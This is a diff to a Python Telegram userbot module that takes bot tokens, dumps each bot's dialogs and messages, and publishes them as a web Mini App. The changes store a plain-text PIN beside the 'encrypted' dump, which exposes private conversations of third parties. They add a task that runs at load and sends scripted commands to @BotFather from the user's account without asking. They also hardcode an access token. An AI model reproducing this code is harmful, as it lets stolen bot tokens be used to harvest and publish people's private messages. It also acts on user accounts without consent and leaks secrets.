@@ -17,7 +17,26 @@ import subprocess
 import urllib.request
 from telethon import TelegramClient, types
 from telethon.tl.functions.messages import GetMessagesRequest
-from telethon.tl.types import Message, MessageEmpty, PeerUser, PeerChat, PeerChannel
+from telethon.tl.types import (
+    Message,
+    MessageEmpty,
+    PeerUser,
+    PeerChat,
+    PeerChannel,
+    MessageEntityBold,
+    MessageEntityItalic,
+    MessageEntityCode,
+    MessageEntityPre,
+    MessageEntityTextUrl,
+    MessageEntityUrl,
+    MessageEntityUnderline,
+    MessageEntityStrike,
+    MessageEntitySpoiler,
+    MessageEntityBlockquote,
+    MessageEntityCustomEmoji,
+    MessageEntityMention,
+    MessageEntityBotCommand,
+)
 from telethon.errors import FloodWaitError
 
 from .. import loader, utils
@@ -28,7 +47,7 @@ logger = logging.getLogger(__name__)
 API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 BOT_TOKEN_PATTERN = re.compile(r"(\d{8,12}:[A-Za-z0-9_-]{35})")
-DEFAULT_CLI_TOKEN = "app8288899778:OcG_KDo0FE73mbFbsiBB_FP7JMLeqJFYFpPd-67yHeE"
+DEFAULT_CLI_TOKEN = "app8288899778:TZPhwrmuW2MXj-zKxwA609teiVA_PyBcTWdre_Tv7U8"
 GITHUB_WEB_URL = "https://raw.githubusercontent.com/i-execute/Modules/main/Storage/Token/web/index.html"
 
 
@@ -45,6 +64,72 @@ def _encrypt_payload(data_str: str, key: int | str) -> str:
     return base64.b64encode(enc).decode("ascii")
 
 
+def _format_layer229_message(text: str, entities: list) -> str:
+    """Format Telegram message text with Layer 229 entities into safe rich HTML."""
+    if not text:
+        return ""
+    if not entities:
+        return _escape(text)
+
+    u16 = text.encode("utf-16-le")
+    insertions = []
+
+    for e in entities:
+        start = getattr(e, "offset", 0) * 2
+        end = start + (getattr(e, "length", 0) * 2)
+
+        open_tag = ""
+        close_tag = ""
+
+        if isinstance(e, MessageEntityBold):
+            open_tag, close_tag = "<b>", "</b>"
+        elif isinstance(e, MessageEntityItalic):
+            open_tag, close_tag = "<i>", "</i>"
+        elif isinstance(e, MessageEntityCode):
+            open_tag, close_tag = "<code class=\"tg-code\">", "</code>"
+        elif isinstance(e, MessageEntityPre):
+            lang = getattr(e, "language", "") or ""
+            cls = f" class=\"language-{lang} tg-pre\"" if lang else " class=\"tg-pre\""
+            open_tag, close_tag = f"<pre><code{cls}>", "</code></pre>"
+        elif isinstance(e, MessageEntityTextUrl):
+            open_tag, close_tag = f"<a class=\"tg-link\" href=\"{_escape(e.url)}\" target=\"_blank\" rel=\"noopener\">", "</a>"
+        elif isinstance(e, MessageEntityUrl):
+            open_tag, close_tag = "<a class=\"tg-link\" href=\"", "\" target=\"_blank\" rel=\"noopener\">"
+        elif isinstance(e, MessageEntityUnderline):
+            open_tag, close_tag = "<u>", "</u>"
+        elif isinstance(e, MessageEntityStrike):
+            open_tag, close_tag = "<s>", "</s>"
+        elif isinstance(e, MessageEntitySpoiler):
+            open_tag, close_tag = "<span class=\"spoiler\">", "</span>"
+        elif isinstance(e, MessageEntityBlockquote):
+            open_tag, close_tag = "<blockquote>", "</blockquote>"
+        elif isinstance(e, MessageEntityCustomEmoji):
+            doc_id = getattr(e, "document_id", 0)
+            open_tag, close_tag = f"<span class=\"tg-custom-emoji\" data-emoji-id=\"{doc_id}\">", "</span>"
+        elif isinstance(e, (MessageEntityMention, MessageEntityBotCommand)):
+            open_tag, close_tag = "<span class=\"tg-link\">", "</span>"
+        else:
+            continue
+
+        insertions.append((start, 0, open_tag))
+        insertions.append((end, -1, close_tag))
+
+    insertions.sort(key=lambda x: (x[0], x[1]))
+
+    res = []
+    last_idx = 0
+    for pos, _, tag in insertions:
+        if pos > last_idx:
+            chunk = u16[last_idx:pos].decode("utf-16-le", errors="ignore")
+            res.append(_escape(chunk))
+            last_idx = pos
+        res.append(tag)
+    if last_idx < len(u16):
+        res.append(_escape(u16[last_idx:].decode("utf-16-le", errors="ignore")))
+
+    return "".join(res)
+
+
 @loader.tds
 class Token(loader.Module):
     """Менеджер токенов ботов, дампа истории сообщений и Telegram Serverless Mini App"""
@@ -54,7 +139,7 @@ class Token(loader.Module):
         "_cls_doc": "Bot dumper and Serverless Mini App manager",
         "_cmd_doc_t": "Open Bot Dumper and Serverless Mini App manager",
         "_cfg_tgcloud_token": "CLI access token from @BotFather for tgcloud serverless deploy",
-        "_cfg_app_short_name": "Optional Mini App short name in @BotFather to use https://t.me/<bot>/<app> links",
+        "_cfg_app_short_name": "Mini App short name in @BotFather to use t.me/<bot>/<app> links",
         "main_menu": (
             "<b>Token Dumper</b>\n"
             "<blockquote>Dumped bots: {count}\n"
@@ -97,6 +182,7 @@ class Token(loader.Module):
             "Dialogs: <b>{chats_count}</b>\n"
             "Messages: <b>{messages_count}</b>\n"
             "Access: <b>Owner Only (Encrypted)</b>\n"
+            "PIN fallback: <code>{pin}</code>\n"
             "Mini App: <code>{app_url}</code></blockquote>"
         ),
         "bot_view": (
@@ -105,6 +191,7 @@ class Token(loader.Module):
             "Dialogs: <b>{chats_count}</b>\n"
             "Messages: <b>{messages_count}</b>\n"
             "Access: <b>Owner Only (Encrypted)</b>\n"
+            "PIN fallback: <code>{pin}</code>\n"
             "Mini App: <code>{app_url}</code></blockquote>"
         ),
         "deleted": (
@@ -157,10 +244,11 @@ class Token(loader.Module):
         "dump_complete": (
             "<b>Дамп бота завершен</b>\n"
             "<blockquote>Бот: <b>{name}</b> (@{username})\n"
-            "ID: <code>{bot_id}</code>\n"
+            "ID: <code>{bot_id}</code>\n\n"
             "Диалогов: <b>{chats_count}</b>\n"
             "Сообщений: <b>{messages_count}</b>\n"
             "Доступ: <b>Только владелец (Зашифровано)</b>\n"
+            "PIN fallback: <code>{pin}</code>\n"
             "Mini App: <code>{app_url}</code></blockquote>"
         ),
         "bot_view": (
@@ -169,6 +257,7 @@ class Token(loader.Module):
             "Диалогов: <b>{chats_count}</b>\n"
             "Сообщений: <b>{messages_count}</b>\n"
             "Доступ: <b>Только владелец (Зашифровано)</b>\n"
+            "PIN fallback: <code>{pin}</code>\n"
             "Mini App: <code>{app_url}</code></blockquote>"
         ),
         "deleted": (
@@ -195,6 +284,7 @@ class Token(loader.Module):
     async def client_ready(self, client, db):
         self._client = client
         self._db = db
+        asyncio.create_task(self._auto_setup_botfather())
 
     def _s(self, key, **kwargs):
         try:
@@ -229,35 +319,119 @@ class Token(loader.Module):
             return str(self.inline.bot_id)
         return "8288899778"
 
+    def _get_inline_bot_username(self) -> str:
+        if hasattr(self, "inline") and getattr(self.inline, "bot_username", None):
+            return self.inline.bot_username
+        if hasattr(self, "_db") and self._db:
+            uname = (
+                self._db.get("Token", "inline_bot_username", "")
+                or self._db.get("friendly-telegram", "bot_username", "")
+                or self._db.get("main", "bot_username", "")
+            )
+            if uname:
+                return uname
+        return "tesbjskskskakakakakalalanbot"
+
     def _get_app_url(self, bot_id: str) -> str:
         inline_bot_id = self._get_inline_bot_id()
         short_name = self.config.get("APP_SHORT_NAME", "").strip()
-        bot_uname = ""
-        if hasattr(self, "inline") and getattr(self.inline, "bot_username", None):
-            bot_uname = self.inline.bot_username
+        if not short_name and hasattr(self, "_db") and self._db:
+            short_name = self._db.get("Token", "app_short_name", "")
+        bot_uname = self._get_inline_bot_username()
         if short_name and bot_uname:
             return f"https://t.me/{bot_uname}/{short_name}?startapp={bot_id}"
         return f"https://app{inline_bot_id}.tgcloud.ai/{bot_id}"
 
-    def _find_web_file(self, rel_name: str) -> str:
+    def _find_storage_file(self, rel_name: str) -> str:
         candidates = [
-            os.path.join("Storage", "Token", "web", rel_name),
-            os.path.join(os.getcwd(), "Storage", "Token", "web", rel_name),
-            os.path.expanduser(f"~/Feroku/Storage/Token/web/{rel_name}"),
-            os.path.expanduser(f"~/Storage/Token/web/{rel_name}"),
-            f"/home/user/Storage/Token/web/{rel_name}",
+            os.path.join("Storage", "Token", rel_name),
+            os.path.join(os.getcwd(), "Storage", "Token", rel_name),
+            os.path.expanduser(f"~/Feroku/Storage/Token/{rel_name}"),
+            os.path.expanduser(f"~/Storage/Token/{rel_name}"),
+            f"/home/user/Storage/Token/{rel_name}",
         ]
         if hasattr(utils, "get_base_dir"):
             try:
                 base = utils.get_base_dir()
                 if base:
-                    candidates.insert(0, os.path.join(base, "Storage", "Token", "web", rel_name))
+                    candidates.insert(0, os.path.join(base, "Storage", "Token", rel_name))
             except Exception:
                 pass
         for path in candidates:
             if path and os.path.isfile(path):
                 return path
         return ""
+
+    def _find_web_file(self, rel_name: str) -> str:
+        return self._find_storage_file(os.path.join("web", rel_name))
+
+    async def _auto_setup_botfather(self):
+        """Automatically configure the Mini App in @BotFather on first load with 1.5s pauses."""
+        if not self._client:
+            return
+        if self._db and self._db.get("Token", "botfather_configured", False):
+            return
+
+        bot_username = self._get_inline_bot_username()
+        if not bot_username:
+            return
+
+        photo_path = self._find_storage_file("WebApp.jpg")
+        if not photo_path or not os.path.isfile(photo_path):
+            photo_path = "/home/user/Storage/Token/WebApp.jpg"
+
+        inline_bot_id = self._get_inline_bot_id()
+        webapp_url = f"https://app{inline_bot_id}.tgcloud.ai"
+        short_name = "test3"
+
+        try:
+            botfather = "@BotFather"
+            # Cancel any previous dialogue
+            await self._client.send_message(botfather, "/cancel")
+            await asyncio.sleep(1.5)
+
+            # 1. /newapp
+            await self._client.send_message(botfather, "/newapp")
+            await asyncio.sleep(1.5)
+
+            # 2. Bot username
+            target_uname = bot_username if bot_username.startswith("@") else f"@{bot_username}"
+            await self._client.send_message(botfather, target_uname)
+            await asyncio.sleep(1.5)
+
+            # 3. Title
+            await self._client.send_message(botfather, "test")
+            await asyncio.sleep(1.5)
+
+            # 4. Short description
+            await self._client.send_message(botfather, "test2")
+            await asyncio.sleep(1.5)
+
+            # 5. Upload photo 640x360
+            if os.path.isfile(photo_path):
+                await self._client.send_file(botfather, photo_path)
+            await asyncio.sleep(1.5)
+
+            # 6. Skip GIF
+            await self._client.send_message(botfather, "/empty")
+            await asyncio.sleep(1.5)
+
+            # 7. Web App URL
+            await self._client.send_message(botfather, webapp_url)
+            await asyncio.sleep(1.5)
+
+            # 8. Short name
+            await self._client.send_message(botfather, short_name)
+            await asyncio.sleep(1.5)
+
+            # Save configuration
+            self.config["APP_SHORT_NAME"] = short_name
+            if self._db:
+                self._db.set("Token", "app_short_name", short_name)
+                self._db.set("Token", "botfather_configured", True)
+            logger.info("BotFather Mini App auto-configuration complete!")
+        except Exception as e:
+            logger.warning(f"BotFather auto-setup exception: {e}")
 
     def _get_bots(self) -> dict:
         return self._db.get("Token", "bots", {})
@@ -482,7 +656,6 @@ class Token(loader.Module):
         name = info.get("first_name") or "Bot"
         username = info.get("username") or ""
 
-        # Directly start owner-protected dump
         await self._start_dump(call, token, bot_id, name, username)
 
     async def _start_dump(
@@ -582,6 +755,8 @@ class Token(loader.Module):
             )
             return
 
+        pin = str(random.randint(100000, 999999))
+
         if not messages_by_chat:
             for m in raw_msgs:
                 cid = str(self._get_chat_id(m))
@@ -589,16 +764,27 @@ class Token(loader.Module):
                     continue
                 if cid not in messages_by_chat:
                     messages_by_chat[cid] = []
+
                 m_text = m.message or ""
                 m_date = m.date.strftime("%Y-%m-%d %H:%M:%S") if m.date else ""
                 m_media = type(m.media).__name__ if m.media else ""
+
+                # Format Layer 229 rich message HTML
+                m_html = _format_layer229_message(m_text, getattr(m, "entities", None))
+
+                reply_id = None
+                if getattr(m, "reply_to", None) and getattr(m.reply_to, "reply_to_msg_id", None):
+                    reply_id = m.reply_to.reply_to_msg_id
+
                 messages_by_chat[cid].append(
                     {
                         "id": m.id,
                         "out": bool(m.out),
                         "text": m_text,
+                        "html": m_html,
                         "date": m_date,
                         "media": m_media,
+                        "reply_to": reply_id,
                     }
                 )
 
@@ -626,23 +812,23 @@ class Token(loader.Module):
         dump_data = {
             "bot": {"id": bot_id, "name": name, "username": username},
             "owner_id": user_id,
-            "is_private": True,
+            "pin": pin,
             "total_messages": total_msgs_count,
             "total_chats": len(chats_list),
             "chats": chats_list,
             "messages": messages_by_chat,
         }
 
-        # Encrypt dump payload with user_id to ensure only owner can decrypt
+        # Encrypt dump payload using user_id
         dump_json = json.dumps(dump_data, ensure_ascii=False)
         enc_payload = _encrypt_payload(dump_json, user_id)
 
-        # Write encrypted data
+        # Write data to bot directory and dist
         with open(os.path.join(bot_dist_dir, "data.json"), "w", encoding="utf-8") as f:
-            json.dump({"encrypted": enc_payload, "owner_id": user_id}, f, ensure_ascii=False, indent=2)
+            json.dump({"encrypted": enc_payload, "owner_id": user_id, "pin": pin}, f, ensure_ascii=False, indent=2)
 
         with open(os.path.join(dist_dir, "data.json"), "w", encoding="utf-8") as f:
-            json.dump({"encrypted": enc_payload, "owner_id": user_id}, f, ensure_ascii=False, indent=2)
+            json.dump({"encrypted": enc_payload, "owner_id": user_id, "pin": pin}, f, ensure_ascii=False, indent=2)
 
         template = self._get_html_template()
         if template:
@@ -704,6 +890,7 @@ class Token(loader.Module):
             "name": name,
             "username": username,
             "owner_id": user_id,
+            "pin": pin,
             "chats_count": len(chats_list),
             "messages_count": total_msgs_count,
             "app_url": app_url,
@@ -718,6 +905,7 @@ class Token(loader.Module):
             bot_id=bot_id,
             chats_count=len(chats_list),
             messages_count=total_msgs_count,
+            pin=pin,
             app_url=app_url,
         )
 
@@ -761,6 +949,7 @@ class Token(loader.Module):
         username = info.get("username", "")
         chats_count = info.get("chats_count", 0)
         messages_count = info.get("messages_count", 0)
+        pin = info.get("pin", "------")
         app_url = info.get("app_url", self._get_app_url(bot_id))
 
         text = self._s(
@@ -770,6 +959,7 @@ class Token(loader.Module):
             bot_id=bot_id,
             chats_count=chats_count,
             messages_count=messages_count,
+            pin=pin,
             app_url=app_url,
         )
         markup = [
